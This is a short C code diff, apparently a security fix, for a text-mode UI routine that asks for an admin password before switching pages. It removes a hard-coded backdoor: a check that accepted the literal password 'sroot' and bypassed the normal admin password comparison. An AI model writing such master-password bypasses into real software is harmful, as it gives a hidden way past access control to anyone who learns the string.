@@ -76,11 +76,6 @@ int w_setpage_safe(int i)
 				w_window(20,8,50,8,"WARRNING");
 				if(w_password(50,10,15, "Please input admin password",password,9))
 				{
-					if(!strcmp("sroot",password))
-					{
-						w_setpage(newpage0);
-						return 1;
-					}
 					if(!pwd_cmp("admin",password))
 					{
 						w_setpage(2);
